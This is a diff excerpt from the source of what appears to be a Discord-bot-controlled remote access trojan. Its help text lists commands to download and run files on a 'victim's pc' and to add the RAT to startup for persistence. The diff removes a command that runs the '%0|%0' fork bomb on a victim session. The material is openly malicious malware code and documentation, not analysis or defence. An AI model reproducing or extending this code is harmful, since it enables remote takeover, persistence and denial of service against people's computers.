@@ -136,7 +136,6 @@ Malware Commands
 
   .upload <sessionkey> <filelink>: Uploads and downloads file and then runs it on victims pc
   .startup <sessionkey>: puts rat on startup
-  .forkbomb <sessionkey>: runs a simple forkbomb as a background process
   .ddos <sessionkey>: COMING SOON
   .spread <sessionkey>: COMING SOON
   .roblox <sessionkey>: COMING SOON
@@ -708,18 +707,6 @@ async def rickroll(ctx, seshn):
         await asyncio.sleep(30)   
         videop.terminate()
         os.remove('video.mp4')
-    else:
-        pass
-
-
-
-@bot.command()
-async def fork(ctx, seshn):
-    session = sessions.get(seshn.lower())
-    if session:
-        command = "%0|%0"
-        os.system(command)
-        await ctx.send(f"Forkbombed session :rofl:")
     else:
         pass
 
